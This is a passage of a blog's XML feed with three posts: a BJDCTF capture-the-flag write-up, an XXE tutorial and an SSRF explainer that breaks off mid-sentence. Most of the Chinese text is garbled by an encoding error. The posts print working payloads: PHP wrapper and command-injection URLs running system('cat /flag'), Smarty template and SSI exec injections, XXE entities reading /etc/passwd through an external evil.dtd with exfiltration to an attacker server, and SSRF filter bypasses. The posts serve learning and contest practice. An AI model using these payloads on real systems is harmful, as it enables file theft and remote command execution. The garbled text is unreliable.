payload?a=QNKCDZO&amp;b=aabg7XSsï¼Œå¾—åˆ°</p><img src="/2020/01/17/BJDCTFwp/MD53.png" class="" title="examplename}å¼ºæ¯”è¾ƒï¼Œæ²¡æœ‰è§„å®šå­—ç¬¦ä¸²å¦‚æœè¿™ä¸ªæ—¶å€™ä¼ å…¥çš„æ˜¯æ•°ç»„ä¸æ˜¯å­—ç¬¦ä¸²ï¼Œmd5ï¼ˆï¼‰å‡½æ•°æ— æ³•è§£å‡ºå…¶æ•°å€¼å¹¶ä¸”ä¸ä¼šæŠ¥é”™ï¼Œå°±ä¼šå¾—åˆ°æ•°å€¼ç›¸ç­‰ {%asset_img md54.png examplename"><p>5.Mark loves cat</p><p>æ‰“å¼€é¢˜ç›®åœ°å€ï¼Œæ²¡å‘ç°ä»€ä¹ˆ</p><p>ç”¨æ•æ„Ÿç›®å½•æ‰«æå·¥å…· syc-scan</p><p>python3 syc.py <a href="http://222.186.56.247:8105/" target="_blank" rel="noopener">http://222.186.56.247:8105/</a></p><p>å‘ç°å­˜åœ¨gitæ³„éœ²</p><p>ç”¨git_extract å·¥å…·è¿›è¡Œæ¢å¤</p><p>python git_extract.py <a href="http://222.186.56.247:8105/.git/" target="_blank" rel="noopener">http://222.186.56.247:8105/.git/</a></p><p>åœ¨ç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„æ–‡ä»¶ï¼Œæ‰“å¼€æ˜¯</p><img src="/2020/01/17/BJDCTFwp/mark.png" class="" title="examplename"><p>è¦ç»•è¿‡è¿™ä¸‰ä¸ªæ¡ä»¶æ‰èƒ½å¾—åˆ°flag</p><p>æ„é€ payloadï¼š?arc=flag&amp;flag=arc&amp;_GET=ntr postè¯·æ±‚:_POST[flag]=fuck</p><img src="/2020/01/17/BJDCTFwp/mark2.png" class="" title="examplename"><ol start="6"><li>è¿™åºåˆ—åŒ–ä¹Ÿå¤ªç®€å•äº†å§</li></ol><p>æ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜</p><p>åœ¨ç½‘ä¸Šæ‰¾äº†å¥½å¤šåšå®¢ç ”ç©¶äº†åŠå¤©ï¼Œææ‡‚äº†ä¸€ç‚¹ä¸€ç‚¹</p><img src="/2020/01/17/BJDCTFwp/se1.png" class="" title="examplename"><p>æŠŠä¼ å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å±æ€§ä¸ªæ•°æ›´æ”¹æˆå¤§äº 1 çš„ä»»ä½•æ•°æ¥ç»•è¿‡_wakeup()</p><img src="/2020/01/17/BJDCTFwp/se.png" class="" title="examplename"><p>7.zjctf</p><p>é€šè¿‡text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=å†™å…¥é‚£å¥è¯,å†ç”¨file=php://filter/read=convert.base64-encode/resource=next.phpä»¥base64çš„æ–¹å¼è¯»å–æ–‡ä»¶ï¼Œbase64è§£å¯†å¾—åˆ°next.phpæ–‡ä»¶</p><p>é€šè¿‡æµ‹è¯•/next.php?\S*=${getFlag()}&amp;cmd=system(â€œcd ../../../;lsâ€)å‘ç°æ ¹ç›®å½•ä¸‹æœ‰flag</p><p>æ„é€ payloadï¼š/next.php?\S*=${getFlag()}&amp;cmd=system(â€œcat /flagâ€)</p><img src="/2020/01/17/BJDCTFwp/zjctf.png" class="" title="examplename"><p>8.The_mystery_of_ip</p><p>ç‚¹å‡»flagå‡ºç°äº†ipï¼ŒæŠ“åŒ…</p><p>çŒœæµ‹å¯èƒ½æ˜¯smartyæ¨¡æ¿æ³¨å…¥ï¼Œæ”¹ä¸€ä¸‹x-forwarded-for:{if phpindfo()}{/if}</p><img src="/2020/01/17/BJDCTFwp/ip1.png" class="" title="examplename"><p>åº•ä¸‹æˆåŠŸæ˜¾ç¤ºäº†phpinfoçš„é¡µé¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹x-forwarded-forçš„å€¼æŸ¥è¯¢åˆ—è¡¨ï¼šX-Forwarded-For: {if system(â€˜lsâ€™)}{/if}</p><p>å¯ä»¥å‘ç°å‡ºç°äº†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p>X-Forwarded-For: {if system(â€œcd ../../../;lsâ€)}{/if}å‘ä¸Šå±‚æ–‡ä»¶éå†ç›®å½•</p><img src="/2020/01/17/BJDCTFwp/ip2.png" class="" title="examplename"><p>å‘ç°äº†flagæ–‡ä»¶ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»å–X-Forwarded-For: {if system(â€œcat /flagâ€)}{/if}</p><img src="/2020/01/17/BJDCTFwp/ip3.png" class="" title="examplename"><p>9.easy_search</p><p>æ ¹æ®hintæ˜¯vimæ³„æ¼ï¼Œ<a href="http://222.186.56.247:8107/index.php.swpå¯ä»¥çœ‹åˆ°æºç ï¼Œæ ¹æ®æºç å¾—å‡ºç™»å½•å¯†ç ä¸º2020666" target="_blank" rel="noopener">http://222.186.56.247:8107/index.php.swpå¯ä»¥çœ‹åˆ°æºç ï¼Œæ ¹æ®æºç å¾—å‡ºç™»å½•å¯†ç ä¸º2020666</a></p><p>è´¦å·éšä¾¿è¾“ä¸€ä¸ªï¼Œå†™ä¸Šå¯†ç ï¼ŒburpæŠ“åŒ…</p><p>çœ‹åˆ°æœ‰ä¸€ä¸ªurl_is_here</p><p>çŒœæµ‹æ˜¯ssiæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/easy_search.png" class="" title="examplename"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/easysearch2.png" class="" title="examplename"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#execcmd&#x3D;&quot;cat..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/search3.png" class="" title="examplename">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Misc&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç­¾ä¸ªåˆ°ï¼Ÿ
    
    </summary>
    
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>XXEæ¼æ´</title>
    <link href="http://yoursite.com/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-01-16T06:32:30.000Z</published>
    <updated>2020-02-09T00:50:10.331Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-ä»€ä¹ˆæ˜¯XXEæ¼æ´"><a href="#1-ä»€ä¹ˆæ˜¯XXEæ¼æ´" class="headerlink" title="1.ä»€ä¹ˆæ˜¯XXEæ¼æ´"></a>1.ä»€ä¹ˆæ˜¯XXEæ¼æ´<a id="more"></a></h4><p>XXEæ¼æ´å…¨ç§°ä¸ºXML External Entity Injection å³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³</p><p>DTD:æ–‡æ¡£ç±»å‹å®šä¹‰</p><p>DTDå®ä½“<br>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p><p>å®ä½“åˆåˆ†ä¸ºä¸€èˆ¬å®ä½“å’Œå‚æ•°å®ä½“<br>1ï¼Œä¸€èˆ¬å®ä½“çš„å£°æ˜è¯­æ³•:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“å &quot;å®ä½“å†…å®¹&quot;&gt;</span><br></pre></td></tr></table></figure><p>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š&amp;å®ä½“åï¼›<br>2ï¼Œå‚æ•°å®ä½“åªèƒ½åœ¨DTDä¸­ä½¿ç”¨ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ ¼å¼ï¼š <code>&lt;!ENTITY % å®ä½“å &quot;å®ä½“å†…å®¹&quot;&gt;</code><br>å¼•ç”¨å®ä½“çš„æ–¹å¼ï¼š%å®ä½“åï¼›</p><p>1ï¼Œå†…éƒ¨å®ä½“å£°æ˜:<code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt; ex:&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></p><p>  æ³¨æ„å’ŒDTDä¸­çš„å…ƒç´ å£°æ˜åŒºåˆ«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å£°æ˜å…ƒç´ &gt;</span><br></pre></td></tr></table></figure><p><strong>2ï¼Œå¤–éƒ¨å®ä½“å£°æ˜:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML-External-Entityï¼‰"><a href="#XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML-External-Entityï¼‰" class="headerlink" title="XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML External Entityï¼‰"></a>XXEçš„æ”»å‡»ä¸å±å®³ï¼ˆXML External Entityï¼‰</h2><h4 id="1ï¼Œä½•ä¸ºXXE"><a href="#1ï¼Œä½•ä¸ºXXE" class="headerlink" title="1ï¼Œä½•ä¸ºXXE?"></a>1ï¼Œä½•ä¸ºXXE?</h4><p>ç­”ï¼š xxeä¹Ÿå°±æ˜¯xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚ä¹Ÿå°±æ˜¯ä¸Šæ–‡ä¸­åŠ ç²—çš„é‚£ä¸€éƒ¨åˆ†ã€‚</p><h4 id="2ï¼Œæ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ"><a href="#2ï¼Œæ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ" class="headerlink" title="2ï¼Œæ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ"></a>2ï¼Œæ€æ ·æ„å»ºå¤–éƒ¨å®ä½“æ³¨å…¥ï¼Ÿ</h4><p>æ–¹å¼ä¸€ï¼šç›´æ¥é€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜<br>XMLå†…å®¹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ–¹å¼äºŒï¼šé€šè¿‡DTDæ–‡æ¡£å¼•å…¥å¤–éƒ¨DTDæ–‡æ¡£ï¼Œå†å¼•å…¥å¤–éƒ¨å®ä½“å£°æ˜<br>XMLå†…å®¹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://mark4z5.com/evil.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;B;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTDæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure><p>æ–¹å¼ä¸‰ï¼šé€šè¿‡DTDå¤–éƒ¨å®ä½“å£°æ˜å¼•å…¥å¤–éƒ¨å®ä½“å£°æ˜<br>å¥½åƒæœ‰ç‚¹æ‹—å£ï¼Œå…¶å®æ„æ€å°±æ˜¯å…ˆå†™ä¸€ä¸ªå¤–éƒ¨å®ä½“å£°æ˜ï¼Œç„¶åå¼•ç”¨çš„æ˜¯åœ¨æ”»å‡»è€…æœåŠ¡å™¨ä¸Šé¢çš„å¤–éƒ¨å®ä½“å£°æ˜<br>å…·ä½“çœ‹ä¾‹å­,XMLå†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure><p>dtdæ–‡ä»¶å†…å®¹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ"><a href="#äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ" class="headerlink" title="äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ"></a>äº§ç”Ÿå“ªäº›å±å®³ï¼Ÿ</h4><p>XXEå±å®³1ï¼šè¯»å–ä»»æ„æ–‡ä»¶</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145026738-1407663000.png" alt="img"></p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145035082-1171815922.png" alt="img"></p><p>è¯¥CASEæ˜¯è¯»å–/etc/passwdï¼Œæœ‰äº›XMLè§£æåº“æ”¯æŒåˆ—ç›®å½•ï¼Œæ”»å‡»è€…é€šè¿‡åˆ—ç›®å½•ã€è¯»æ–‡ä»¶ï¼Œè·å–å¸å·å¯†ç åè¿›ä¸€æ­¥æ”»å‡»ï¼Œå¦‚è¯»å–tomcat-users.xmlå¾—åˆ°å¸å·å¯†ç åç™»å½•tomcatçš„manageréƒ¨ç½²webshellã€‚</p><p>å¦å¤–ï¼Œæ•°æ®ä¸å›æ˜¾å°±æ²¡æœ‰é—®é¢˜äº†å—ï¼Ÿå¦‚ä¸‹å›¾</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145050972-1215502458.png" alt="img"></p><p>ä¸ï¼Œå¯ä»¥æŠŠæ•°æ®å‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145104285-1507820174.png" alt="img"></p><p>è¿œç¨‹evil.dtdæ–‡ä»¶å†…å®¹å¦‚ä¸‹</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145111863-976147511.png" alt="img"></p><p>è§¦å‘XXEæ”»å‡»åï¼ŒæœåŠ¡å™¨ä¼šæŠŠæ–‡ä»¶å†…å®¹å‘é€åˆ°æ”»å‡»è€…ç½‘ç«™</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145120957-1229784360.png" alt="img"></p><p>XXEå±å®³2ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145129957-1907303428.png" alt="img"></p><p>è¯¥CASEæ˜¯åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>XXEå±å®³3ï¼šæ¢æµ‹å†…ç½‘ç«¯å£</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145153722-1549362415.png" alt="img"></p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145204847-766408731.png" alt="img"></p><p>è¯¥CASEæ˜¯æ¢æµ‹192.168.1.1çš„80ã€81ç«¯å£ï¼Œé€šè¿‡è¿”å›çš„â€œConnection refusedâ€å¯ä»¥çŸ¥é“è¯¥81ç«¯å£æ˜¯closedçš„ï¼Œè€Œ80ç«¯å£æ˜¯opençš„ã€‚</p><p>XXEå±å®³4ï¼šæ”»å‡»å†…ç½‘ç½‘ç«™</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145220472-216779729.png" alt="img"></p><p>è¯¥CASEæ˜¯æ”»å‡»å†…ç½‘struts2ç½‘ç«™ï¼Œè¿œç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><p>(XXEçš„å±å®³ä¸æ”»å‡»éƒ¨åˆ†ç”¨çš„æ˜¯ä¸‹é¢è¿™ç¯‡åšå®¢çš„ææ–™ï¼Œè¿™é‡Œé™„ä¸Šå‡ºå¤„)<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_40491569/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83066200</a></p><p>è¯»å–ip:file:///proc/net/arp</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-ä»€ä¹ˆæ˜¯XXEæ¼æ´&quot;&gt;&lt;a href=&quot;#1-ä»€ä¹ˆæ˜¯XXEæ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;1.ä»€ä¹ˆæ˜¯XXEæ¼æ´&quot;&gt;&lt;/a&gt;1.ä»€ä¹ˆæ˜¯XXEæ¼æ´
    
    </summary>
    
    
    
      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>ssrf</title>
    <link href="http://yoursite.com/2020/01/16/ssrf/"/>
    <id>http://yoursite.com/2020/01/16/ssrf/</id>
    <published>2020-01-16T02:55:29.000Z</published>
    <updated>2020-01-16T08:04:30.233Z</updated>
    
    <content type="html"><![CDATA[<h4 id="SSRFæ¼æ´ä»‹ç»ï¼š"><a href="#SSRFæ¼æ´ä»‹ç»ï¼š" class="headerlink" title="SSRFæ¼æ´ä»‹ç»ï¼š"></a>SSRFæ¼æ´ä»‹ç»ï¼š<a id="more"></a></h4><p>ã€€ã€€SSRFæ¼æ´ï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰ï¼šæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚</p><h4 id="SSRFæ¼æ´åŸç†ï¼š"><a href="#SSRFæ¼æ´åŸç†ï¼š" class="headerlink" title="SSRFæ¼æ´åŸç†ï¼š"></a>SSRFæ¼æ´åŸç†ï¼š</h4><p>ã€€ã€€SSRFå½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ ã€‚SSRFæ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p><h4 id="SSRFæ¼æ´åˆ©ç”¨æ‰‹æ®µï¼š"><a href="#SSRFæ¼æ´åˆ©ç”¨æ‰‹æ®µï¼š" class="headerlink" title="SSRFæ¼æ´åˆ©ç”¨æ‰‹æ®µï¼š"></a>SSRFæ¼æ´åˆ©ç”¨æ‰‹æ®µï¼š</h4><p>ã€€ã€€1.å¯ä»¥å¯¹å¤–ç½‘ã€å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼ŒæŸäº›æƒ…å†µä¸‹ç«¯å£çš„Bannerä¼šå›æ˜¾å‡ºæ¥ï¼ˆæ¯”å¦‚3306çš„ï¼‰ï¼›</p><p>ã€€ã€€2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„æœ‰æ¼æ´ç¨‹åºï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰ï¼›</p><p>ã€€ã€€3.å¯ä»¥å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼ŒåŸç†æ˜¯é€šè¿‡è¯·æ±‚é»˜è®¤çš„æ–‡ä»¶å¾—åˆ°ç‰¹å®šçš„æŒ‡çº¹ï¼›</p><p>ã€€ã€€4.æ”»å‡»å†…ç½‘æˆ–å¤–ç½‘æœ‰æ¼æ´çš„Webåº”ç”¨ï¼›</p><p>ã€€ã€€5.ä½¿ç”¨fileï¼š///åè®®è¯»å–æœ¬åœ°æ–‡ä»¶(æˆ–å…¶ä»–åè®®ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ã€€ã€€http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;192.168.1.10:3306</span><br><span class="line"></span><br><span class="line">ã€€ã€€http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h4 id="SSRFæ¼æ´å‡ºç°ç‚¹ï¼š"><a href="#SSRFæ¼æ´å‡ºç°ç‚¹ï¼š" class="headerlink" title="***SSRFæ¼æ´å‡ºç°ç‚¹ï¼š"></a>***SSRFæ¼æ´å‡ºç°ç‚¹ï¼š</h4><p>ã€€ã€€1.åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€</p><p>ã€€ã€€2.è½¬ç æœåŠ¡ï¼ˆé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ï¼Œä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•çš„æµè§ˆï¼‰</p><p>ã€€ã€€3.åœ¨çº¿ç¿»è¯‘</p><p>ã€€ã€€4.å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p><p>ã€€ã€€5.å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</p><p>ã€€ã€€6.æœªå…¬å¼€çš„apiå®ç°åŠè°ƒç”¨URLçš„åŠŸèƒ½</p><p>ã€€ã€€7.ä»URLå…³é”®å­—ä¸­å¯»æ‰¾</p><h4 id="SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š"><a href="#SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š" class="headerlink" title="***SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š"></a>***SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š</h4><p>ã€€ã€€1.@ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<a href="http://abc.com@127.0.0.1" target="_blank" rel="noopener">http://abc.com@127.0.0.1</a></p><p>ã€€ã€€2.æ·»åŠ ç«¯å£å·ã€€ã€€ã€€ã€€ã€€ã€€<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>ã€€ã€€3.çŸ­åœ°å€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<a href="https://0x9.me/cuGfD" target="_blank" rel="noopener">https://0x9.me/cuGfD</a></p><p>ã€€ã€€4.å¯ä»¥æŒ‡å‘ä»»æ„ipçš„åŸŸåã€€ xip.io</p><p>ã€€ã€€5.ipåœ°å€è½¬æ¢æˆè¿›åˆ¶æ¥è®¿é—® 192.168.0.1=3232235521ï¼ˆåè¿›åˆ¶ï¼‰</p><p>ã€€ã€€6.éHTTPåè®®</p><p>ã€€ã€€7.DNS Rebinding</p><h3 id="SSRFæ¼æ´çš„éªŒè¯"><a href="#SSRFæ¼æ´çš„éªŒè¯" class="headerlink" title="***SSRFæ¼æ´çš„éªŒè¯"></a>***SSRFæ¼æ´çš„éªŒè¯</h3><p>æˆ‘ä»¬å…ˆéªŒè¯ï¼Œè¯·æ±‚æ˜¯å¦æ˜¯æœåŠ¡å™¨ç«¯å‘å‡ºçš„ï¼Œå¯ä»¥å³é”®å›¾ç‰‡ï¼Œä½¿ç”¨æ–°çª—å£æ‰“å¼€å›¾ç‰‡ï¼Œå¦‚æœæµè§ˆå™¨ä¸Šåœ°å€æ æ˜¯<a href="http://www.baidu.com/img/bd_logo1.pngï¼Œè¯´æ˜ä¸å­˜åœ¨SSRFæ¼æ´ã€‚" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.pngï¼Œè¯´æ˜ä¸å­˜åœ¨SSRFæ¼æ´ã€‚</a></p><p>å¯ä»¥ç”¨Firebug æˆ–è€…burpsuiteæŠ“åŒ…å·¥å…·ï¼ŒæŸ¥çœ‹è¯·æ±‚æ•°æ®åŒ…ä¸­æ˜¯å¦åŒ…å«<a href="http://www.baidu.com/img/bd_logo1.pngè¿™ä¸ªè¯·æ±‚ã€‚ç”±äºSSRFæ˜¯æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨åŠ è½½è¿™å¼ å›¾ç‰‡çš„æ—¶å€™æœ¬åœ°æµè§ˆå™¨ä¸­ä¸åº”è¯¥å­˜åœ¨å›¾ç‰‡çš„è¯·æ±‚ã€‚" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.pngè¿™ä¸ªè¯·æ±‚ã€‚ç”±äºSSRFæ˜¯æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨åŠ è½½è¿™å¼ 